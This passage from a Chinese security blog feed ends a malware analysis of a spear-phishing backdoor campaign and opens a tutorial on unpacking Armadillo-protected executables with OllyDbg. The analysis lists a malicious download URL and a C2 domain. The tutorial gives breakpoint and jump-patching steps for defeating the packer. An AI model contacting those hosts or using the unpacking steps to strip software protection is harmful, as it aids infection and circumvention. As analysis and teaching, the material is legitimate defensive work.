src="http://hacky.wang/blog/20190530/eBifkMoWRjBW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关闭数据执行保护DEP<br>    <img src="http://hacky.wang/blog/20190530/Bfkpo0S2QVE4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行后门远控操作，主要的行为有键盘记录，截图，视频，发送数据，联网下载数据，检索服务，创建开启服务，程序执行，傀儡进程，提权关机。</p><ul><li>提权关机<br>  <img src="http://hacky.wang/blog/20190530/FFjpLz4J43FX.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/pYLAhPk3gBQf.png?imageslim" alt="mark"></li><li>键盘记录<br>  <img src="http://hacky.wang/blog/20190530/mhIdck9OnGao.png?imageslim" alt="mark"></li><li>发送键盘输入数据<br>  <img src="http://hacky.wang/blog/20190530/oOK0pcOh4ihn.png?imageslim" alt="mark"></li><li>安装软件信息，并发送<br>  <img src="http://hacky.wang/blog/20190530/xTgtjda9jv14.png?imageslim" alt="mark"></li><li>从Internet上读取可执行的shellcode，并执行<br>  <img src="http://hacky.wang/blog/20190530/RY3FfWB9h30L.png?imageslim" alt="mark"></li><li>获取进程列表<br>  <img src="http://hacky.wang/blog/20190530/UIiP1XJeuXdw.png?imageslim" alt="mark"></li><li>利用管道实现和C2之间的数据交互<br>  <img src="http://hacky.wang/blog/20190530/ECdPKzU9Lxt9.png?imageslim" alt="mark"></li><li>截图<br>  <img src="http://hacky.wang/blog/20190530/X1nCzCbVrg03.png?imageslim" alt="mark"></li><li>键盘区域<br>  <img src="http://hacky.wang/blog/20190530/wtWgKpNdbMpJ.png?imageslim" alt="mark"></li><li>删除，清空文件<br>  <img src="http://hacky.wang/blog/20190530/BDFdEqEMSBTB.png?imageslim" alt="mark"></li><li>清空COOKIE和用户名密码<br>  <img src="http://hacky.wang/blog/20190530/vgx2dLTQ52uX.png?imageslim" alt="mark"></li><li>音视频<br>  <img src="http://hacky.wang/blog/20190530/HxEReejnTbhM.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/weGL22cJNAxS.png?imageslim" alt="mark"></li><li>从Internet上下载数据并执行<br>  <img src="http://hacky.wang/blog/20190530/MD6BA3jtt83K.png?imageslim" alt="mark"></li><li>获取服务相关信息<br>  <img src="http://hacky.wang/blog/20190530/7bKJHwCaBzoO.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;综上，对此样本定性为<strong>后门远控类文件</strong>。</p><h2 id="0x4-4-298eeexe-exe"><a href="#0x4-4-298eeexe-exe" class="headerlink" title="0x4.4 298eeexe.exe"></a>0x4.4 298eeexe.exe</h2><ul><li>从<a href="http://www.gestomarket.co/hqpi64.exe下载文件，并执行" target="_blank" rel="external">http://www.gestomarket.co/hqpi64.exe下载文件，并执行</a><br>  <img src="http://hacky.wang/blog/20190530/CxyVqwMOJysO.png?imageslim" alt="mark"></li></ul><h2 id="0x4-5-2XC2DF0S-exe"><a href="#0x4-5-2XC2DF0S-exe" class="headerlink" title="0x4.5 2XC2DF0S.exe"></a>0x4.5 2XC2DF0S.exe</h2><ul><li>SHA256为2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47，查壳是UPX的壳，ESP拖一下.<br>  <img src="http://hacky.wang/blog/20190530/2OIjOJJO2bjn.png?imageslim" alt="mark"></li><li>主要使用了SMC技术<br>  <img src="http://hacky.wang/blog/20190530/tDqH0qJrmyse.png?imageslim" alt="mark"></li><li><p>根据动态分析，可以得到样本创建了fyhgzmilgyvvgdu.exe和\「开始」菜单\程序\启动\创建fyhgzmilgyvvgdu.eu.url。创建url的目的是实现了fyhgzmilgyvvgdu.exe的自启动<br>  <img src="http://hacky.wang/blog/20190530/izfY42GDjtxG.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/PbEFY4NVxBxL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/WARLNynOQVC7.png?imageslim" alt="mark"></p></li><li><p>创建自身子进程，并进行进程替换<br>  <img src="http://hacky.wang/blog/20190530/RTpRqfT9lrz4.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/v1XfIa4p0EgQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/Ar9bAD4GBcwQ.png?imageslim" alt="mark"></p></li><li>dump出傀儡进程的PE数据，命名为DumpFrom2d69exe.exe_<br>  <img src="http://hacky.wang/blog/20190530/XBHWFk2lgFEr.png?imageslim" alt="mark"></li></ul><h2 id="0x4-6-DumpFrom2d69exe-exe"><a href="#0x4-6-DumpFrom2d69exe-exe" class="headerlink" title="0x4.6 DumpFrom2d69exe.exe_"></a>0x4.6 DumpFrom2d69exe.exe_</h2><ul><li>首先样本会先链接到C2服务器<code>asdfwrkhl.warzonedns.com</code>，当确认链接上<code>asdfwrkhl.warzonedns.com</code>,此时会从C2上接收数据<br>  <img src="http://hacky.wang/blog/20190531/JnFcBdvpEuNj.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/LuJRzBbnOqD9.png?imageslim" alt="mark"></li><li>然后将自身路径写入SOFTWARE\_rptls注册表中，但是注意的是这个是从2XC2DF0S.exe转储出来的，所以原始的模块名应该是2XC2DF0S.exe。加载资源文件，然后有个函数是解密shellcode，然后在把加载入内存的资源文件作为参数传入，初步怀疑应该从内存中执行。这样有效避免了查杀。将资源文件命名为Resource.bin<br>  <img src="http://hacky.wang/blog/20190531/Np5Pu9zW5rXd.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/0LCl60fJ1Om7.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wsmMrrrwPYBU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wm7wdh5PKRs9.png?imageslim" alt="mark"></li><li>直接就是一个后门程序的主体框架。主要包括三大类的功能，第一交流通信，第二，下载执行，第三，信息记录，第四，测试退出，第五驻留操作。<br>  <img src="http://hacky.wang/blog/20190531/3VhJKujgaWxF.png?imageslim" alt="mark"></li><li>第一：通信交流<br>  <img src="http://hacky.wang/blog/20190531/3zNC6Iv8TbyU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/jHs9TptLnXU1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/zoLRanmKhcXJ.png?imageslim" alt="mark"></li><li>第二：下载执行，但是由于分析的时候，没有处于攻击窗口期，所以没有办法了解到此次下载的是何种程序，然后加载了一些网络库，运行时库<br>  <img src="http://hacky.wang/blog/20190531/7GeLBDmIARA1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/A2sUFO3xp63G.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SzfW0vNHmgMX.png?imageslim" alt="mark"></li><li>第三：信息记录，主要是键盘记录，和常见的手段一样，使用了钩子技术，截获用户的键盘输入，并记录按键信息，把并发送个C2服务器<br>  <img src="http://hacky.wang/blog/20190531/bjEvbMaP086q.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SPgBynQXWoWV.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/oezl9Ao1Mxjq.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ia62OMkAyqt1.png?imageslim" alt="mark"></li><li><p>第四：结束退出，也就是，断开连接，终止线程，删除自身<br>  <img src="http://hacky.wang/blog/20190531/PYQS3fKxCVvl.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/9JBlteNf771m.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/t0Vcy7E3vTn3.png?imageslim" alt="mark"></p></li><li><p>第五：驻留操作。包含了释放资源，运行服务，添加用户等<br>  <img src="http://hacky.wang/blog/20190531/XTmksNUFolcU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ov8jtKnIDlq1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/FhlkNdjSbCpI.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/T7fbWQtCDoet.png?imageslim" alt="mark"></p></li></ul><h2 id="0x4-7-Resource-bin"><a href="#0x4-7-Resource-bin" class="headerlink" title="0x4.7 Resource.bin"></a>0x4.7 Resource.bin</h2><ul><li>释放<code>C:\Users\hacky\AppData\Local\Temp\dismcore.dll</code>和<code>C:\Users\hacky\AppData\Local\Temp\ellocnak.xml</code><br>  <img src="http://hacky.wang/blog/20190531/OXR5A7GOrBVQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/3ERiffs6sFkT.png?imageslim" alt="mark"></li><li>然后调用C:\Windows\system32\pkgmgr.exe，安装安装KB929761更新包，可能目的是排除竞争者<br>  <img src="http://hacky.wang/blog/20190531/KXFIlim7xvcJ.png?imageslim" alt="mark"></li></ul><h2 id="0x4-8-dismcore-dll"><a href="#0x4-8-dismcore-dll" class="headerlink" title="0x4.8 dismcore.dll"></a>0x4.8 dismcore.dll</h2><ul><li>读取SOFTWARE\_rptls的值，这个是其实是2XC2DF0S.exe的路径，然后截取去文件名。检查进程列表中是否存在这样的进程，有则关闭，然后在重新创建一个进程即可！<br>  <img src="http://hacky.wang/blog/20190531/MCoNO1kE6J0A.png?imageslim" alt="mark"></li></ul><h1 id="0x5-yara规则编写"><a href="#0x5-yara规则编写" class="headerlink" title="0x5 yara规则编写"></a>0x5 yara规则编写</h1><ul><li>   <img src="http://hacky.wang/blog/20190601/YxECxIiG24Nw.png?imageslim" alt="mark"><h1 id="0x6-后记"><a href="#0x6-后记" class="headerlink" title="0x6 后记"></a>0x6 后记</h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习样本分析两年了，从最开始的简单的蠕虫到后来的勒索病毒，再到挖矿病毒，再到现在的APT样本。总结一下，样本分析最重要的是心细和心诚。心细不多说。何谓心诚，心诚则灵。对于样本，我们也需要有敬畏之心，需要刨根问题，也就是说，作为一个合格的病毒分析师，首先你需要判断文件黑白，但能够辨别黑白也只能给你打60分。如何成为一个优秀的病毒分析师?在于刨根问底，在于洞悉原理，不是简单的知道样本执行了什么操作。肉眼看到的仅仅都只是表面现象。就像这个样本那个宏一样，肉眼可见其实释放了一个exe，但是他是怎么释放的呢？你一概不知，这样你可能就失去了一个可靠的情报，或者说你很有可能凭借这过于自信的判断。导致<strong>你对这样本的判断是错误的.</strong>但是这对于用户来说是致命的。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;专科学技术，本科学原理，博硕学辩证。对之于样本分析同，仅仅是懂得辩黑白仅仅就是专科的水平，不屑于言之，若能明晓原理，可达登堂入室之功，最后是辩证，也就是知道为何这样做是可行的，这样做是不可行的，不可行之处在于何处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3千多个网站服务器，并高调的在被攻击网站上留下其组织的名称，随后消失了多年。 如今通过研究人员的追踪再次挖出该黑客组织的活动迹象。此次攻击活动通过构造恶意Office Word文档并配合鱼叉邮件发起定向攻击，以“简历更新”作为诱饵文档向攻击目标植入间谍木马，从事情报收集、远控监视及系统破坏等恶意行动。在本次攻击过程中，该组织采用渗透手段攻下多台服务器并将其作为存放攻击代码的跳板。【转】&lt;/p&gt;
&lt;h1 id=&quot;0x1-目录&quot;&gt;&lt;a href=&quot;#0x1-目录&quot; class=&quot;headerlink&quot; title=&quot;0x1 目录&quot;&gt;&lt;/a&gt;0x1 目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.目录&lt;/li&gt;
&lt;li&gt;2.IoC&lt;/li&gt;
&lt;li&gt;3.行为分析&lt;/li&gt;
&lt;li&gt;4.样本分析&lt;/li&gt;
&lt;li&gt;5.yara规则&lt;/li&gt;
&lt;li&gt;6.后记
    
    </summary>
    
      <category term="windows安全" scheme="http://yoursite.com/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章带你学会Armadillo脱壳</title>
    <link href="http://yoursite.com/2019/05/03/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E5%AD%A6%E4%BC%9AArmadillo%E8%84%B1%E5%A3%B3/"/>
    <id>http://yoursite.com/2019/05/03/一篇文章带你学会Armadillo脱壳/</id>
    <published>2019-05-03T07:02:11.000Z</published>
    <updated>2019-05-03T06:25:29.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近在跟进一个APT组织的一次攻击，其中有一个样本使用了Arm加壳，所以花了差不多10多天的时间看看这方面的东西。并总结一下。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章主要参考了FLY和刹那恍惚两位大佬的文章。和录制的视频。以及jcyhlh大侠在2008年写下的总结帖。那时候我估计还在玩泥巴呢。这是我写这篇文章的主要参考来源。前人栽树后人乘凉。此外还看了<strong>看雪的知识库</strong>。基本看了3.x和4.x所有师傅的文章。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章的架构，文章架构主要参照了网上下载的视频教程的架构。并对此作出小小修改和注释以及归纳总结。更加方便我等小白学习成长。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于文章主要脱去的是3.x和4.x的Arm，可能有一些<strong>伪大佬</strong>又要说都发了几百遍了还在发。这篇文章适合我等小白，所以伪大佬勿扰。真大佬可以daidaiwo。<strong>对此我的处理意见是，把其直接挂在文章起始部分</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，加油吧，小伙伴们。</p><h2 id="0x1-Armadillo"><a href="#0x1-Armadillo" class="headerlink" title="0x1 Armadillo"></a>0x1 Armadillo</h2><h3 id="0x1-1-保护机制"><a href="#0x1-1-保护机制" class="headerlink" title="0x1.1 保护机制"></a>0x1.1 保护机制</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Armadillo，中文名穿山甲，本意为犰狳，就是下面那个有点可爱的家伙。<br>    <img src="https://i.loli.net/2019/05/02/5ccaefb30fa36.jpg" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Armadillo主要采用了Debug-Blocker，CopyMem-II， Enable Import Table Elimination，Enable Nanomites Processing，Enable Memory-Patching Protections保护手段。同时也有单双进程之分，造成了保护手段的多样性。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Debug-Blocker，称为阻止调试器，所谓反调试，基本只要开插件都可以过，所以这也是为什么大家脱穿山甲的时候打开IsProcessDebug去反调试选项和忽略异常的原因。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CopyMem-II：双进程保护，最常使用的是<code>bp OpenMutexA</code>,然后转到401000 patch代码。另外一种是修改相反跳转的方法。(脚本方法就是不说了)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enable Import Table Elimination：IAT保护，修改Magic_Jmp。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enable Nanomites Processing就是CC保护，也是Armadillo最强大的保护机制。原理就是就是将程序中的部分代码改写为int3或者向其中插入int3代码。</p><h3 id="0x1-2-前期侦壳"><a href="#0x1-2-前期侦壳" class="headerlink" title="0x1.2 前期侦壳"></a>0x1.2 前期侦壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;知己知彼百战不殆，在脱壳最重要的就是侦壳。这里需要使用到的工具主要有：PEID(不推荐)，exepeinfo，ArmaFP，任务管理器。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中，exepeinfo是用于查壳的，任务管理器是用于判断是单进程还是双进程，如果是双进程就需要双转单。ArmaFP是用于判断其保护模式，是标准模式，还是全保护模式(专业模式)。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不过关于壳的版本，exepeinfo容易误报，所以可以使用这个方法：OD载入程序，下<code>HE OutputDebugStringA</code>断点。shift+F9中断后，看堆栈如果出现如下的，就是4.0以上的壳。这是由于Arm在4.0利用Od在调式保护格式串的消息时会奔溃而新增的反调试技术。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//<span class="number">4.01</span></div><div class="line"><span class="number">0012</span>EC7<span class="number">0</span>   <span class="number">021</span>B580F  /CALL 到 OutputDebugStringA 来自 <span class="number">021</span>B5809</div><div class="line"><span class="number">0012</span>EC74   <span class="number">0012</span>F5E8  \String = <span class="string">"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"</span></div><div class="line">/<span class="number">3</span>.X</div><div class="line">//此时程序运行起来。</div></pre></td></tr></table></figure></p><h2 id="0x2-Armadillo单进程脱壳"><a href="#0x2-Armadillo单进程脱壳" class="headerlink" title="0x2 Armadillo单进程脱壳"></a>0x2 Armadillo单进程脱壳</h2><h3 id="0x2-1-标准单进程Armadillo-3-78-4-xx-脱壳"><a href="#0x2-1-标准单进程Armadillo-3-78-4-xx-脱壳" class="headerlink" title="0x2.1 标准单进程Armadillo 3.78 - 4.xx 脱壳"></a>0x2.1 标准单进程Armadillo 3.78 - 4.xx 脱壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是最简单的加密方法，只需要修改Magic_Jmp就可以了，因为这个版本单进程防护只是加密了IAT，(1)只需要绕过加密，(2)并让其解压压缩区段即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过IAT加密的方法就是修改Magic_Jmp,这是脱穿山甲壳必须使用的方法。步骤如下：</p><ul><li>step1：在<code>GetModuleHandle</code>下硬件断点，可以<code>HE GetModuleHandle</code>或者<code>HE GetModuleHandle+5</code>。</li><li><p>Step2：然后Shift+F9,断下的时候，看堆栈窗口是否存在VirtualAlloc或者VirtualFree，只要出现这两个API函数，就表明快到了。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">000</span>C94C8  |<span class="number">00726</span>DF3  返回到 <span class="number">00726</span>DF3 来自 kernel32.GetModuleHandleA</div><div class="line"><span class="number">000</span>C94CC  |<span class="number">0073</span>BC1C  ASCII <span class="string">"kernel32.dll"</span></div><div class="line"><span class="number">000</span>C94D0  |<span class="number">0073</span>CEC4  ASCII <span class="string">"VirtualAlloc"</span></div><div class="line"><span class="number">000</span>C94D4  |<span class="number">0073</span>FA98</div><div class="line"><span class="number">000</span>C94D8  |<span class="number">77E22270</span>  ntdll.RtlLeaveCriticalSection</div></pre></td></tr></table></figure></li><li><p>Step3：继续Shift+F9，只要堆栈出现kernel32.dll，但是不包含任何其他函数名称，表示到达了返回的时机。此时<strong>执行到返回ctrl+F9</strong>。如何判断之前执行到返回的时机是否正确呢，就是看是否存在LoadLibrary这个API函数。此时就是正确的。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">000</span>C9228  /<span class="number">000</span>C94C8</div><div class="line"><span class="number">000</span>C922C  |<span class="number">00715</span>CE1  返回到 <span class="number">00715</span>CE1 来自 kernel32.GetModuleHandleA</div><div class="line"><span class="number">000</span>C9230  |<span class="number">000</span>C937C  ASCII <span class="string">"kernel32.dll"</span></div><div class="line"><span class="number">000</span>C9234  |<span class="number">000</span>CEAB4</div><div class="line"><span class="number">000</span>C9238  |<span class="number">3</span>CBC24B7</div></pre></td></tr></table></figure></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">00715CE1    8B0D AC407400   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715CE7    89040E          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">ecx</span>], <span class="built_in">eax</span></div><div class="line">00715CEA    A1 AC407400     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715CEF    391C06          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">eax</span>], <span class="built_in">ebx</span></div><div class="line">00715CF2    <span class="number">75</span> <span class="number">16</span>           <span class="keyword">jnz</span>     short 00715D0A</div><div class="line">00715CF4    8D85 B4FEFFFF   <span class="keyword">lea</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-14C]</div><div class="line">00715CFA    <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">00715CFB    FF15 BC627300   <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [7362BC]               <span class="comment">; kernel32.LoadLibraryA</span></div><div class="line">00715D01    8B0D AC407400   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715D07    89040E          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">ecx</span>], <span class="built_in">eax</span></div></pre></td></tr></table></figure><ul><li>此时就可以修改LoadLibrary函数下面的那个条件跳转(00715D12)为jmp，跳转到00425E5C,然后撤销之前的修改。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">00715CF4    8D85 B4FEFFFF   <span class="keyword">lea</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-14C]</div><div class="line">00715CFA    <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">00715CFB    FF15 BC627300   <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [7362BC]               <span class="comment">; kernel32.LoadLibraryA</span></div><div class="line">00715D01    8B0D AC407400   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715D07    89040E          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">ecx</span>], <span class="built_in">eax</span></div><div class="line">00715D0A    A1 AC407400     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [7440AC]</div><div class="line">00715D0F    391C06          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="built_in">eax</span>], <span class="built_in">ebx</span></div><div class="line">00715D12  - 0F84 2F010090   <span class="keyword">je</span>      90715E47</div></pre></td></tr></table></figure></li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">00425E53</span>    <span class="number">395</span>F FC         cmp     dword ptr [edi<span class="number">-4</span>], ebx</div><div class="line"><span class="number">00425E56</span>  ^ <span class="number">0</span>F85 <span class="number">49</span>FEFFFF   jnz     <span class="number">00425</span>CA5</div><div class="line"><span class="number">00425E5</span>C    EB <span class="number">03</span>           jmp     short <span class="number">00425E61</span></div><div class="line"><span class="number">00425E5</span>E    D6              salc</div></pre></td></tr></table></figure><ul><li>Step4：因为外壳肯定需要将存储在某一区段的数据解压到text段，需要对该段进行访问，所以，在内存窗口的程序的text段下访问断点。然后shift+F9。中断在43468F,然后单步，在此代码段的最后一个<code>call ecx</code>处步入就是OEP。<br>  <img src="https://i.loli.net/2019/04/26/5cc3183998afa.png" alt=""><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0043F68F    8B12            <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>]</div><div class="line">0043F691    <span class="number">8955</span> DC         <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">24</span>], <span class="built_in">edx</span></div><div class="line">0043F694    <span class="number">834D</span> FC FF      <span class="keyword">or</span>      <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], FFFFFFFF</div><div class="line">0043F698    EB <span class="number">11</span>           <span class="keyword">jmp</span>     short 0043F6AB</div><div class="line">0043F69A    6A <span class="number">01</span>           <span class="keyword">push</span>    <span class="number">1</span></div></pre></td></tr></table></figure></li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="number">0100739D</span>    6A <span class="number">70</span>           <span class="built_in">push</span>    <span class="number">70</span></div><div class="line"><span class="number">0100739F</span>    <span class="number">68</span> <span class="number">98180001</span>     <span class="built_in">push</span>    <span class="number">01001898</span></div><div class="line"><span class="number">010073A4</span>    E8 BF010000     call    <span class="number">01007568</span></div><div class="line"><span class="number">010073A9</span>    33DB            xor     ebx, ebx</div><div class="line"><span class="number">010073AB</span>    <span class="number">53</span>              <span class="built_in">push</span>    ebx</div><div class="line"><span class="number">010073AC</span>    8B3D CC100001   mov     edi, dword ptr [10010CC]         ; kernel32.GetModuleHandleA</div><div class="line"><span class="number">010073B2</span>    FFD7            call    edi</div><div class="line"><span class="number">010073B4</span>    <span class="number">66</span>:<span class="number">8138</span> 4D5A    cmp     word ptr [eax], 5A4D</div><div class="line"><span class="number">010073B9</span>    <span class="number">75</span> 1F           jnz     short <span class="number">010073DA</span></div><div class="line"><span class="number">010073BB</span>    <span class="number">8B48</span> 3C         mov     ecx, dword ptr [eax+3C]</div><div class="line"><span class="number">010073BE</span>    <span class="number">03C8</span>            add     ecx, eax</div><div class="line"><span class="number">010073C0</span>    <span class="number">8139</span> <span class="number">50450000</span>   cmp     dword ptr [ecx], <span class="number">4550</span></div><div class="line"><span class="number">010073C6</span>    <span class="number">75</span> <span class="number">12</span>           jnz     short <span class="number">010073DA</span></div><div class="line"><span class="number">010073C8</span>    <span class="number">0FB741</span> <span class="number">18</span>       movzx   eax, word ptr [ecx+<span class="number">18</span>]</div><div class="line"><span class="number">010073CC</span>    3D <span class="number">0B010000</span>     cmp     eax, 10B</div><div class="line"><span class="number">010073D1</span>    <span class="number">74</span> 1F           je      short <span class="number">010073F2</span></div><div class="line"><span class="number">010073D3</span>    3D <span class="number">0B020000</span>     cmp     eax, 20B</div><div class="line"><span class="number">010073D8</span>    <span class="number">74</span> <span class="number">05</span>           je      short <span class="number">010073DF</span></div><div class="line"><span class="number">010073DA</span>    895D E4         mov     dword ptr [ebp-1C], ebx</div><div class="line"><span class="number">010073DD</span>   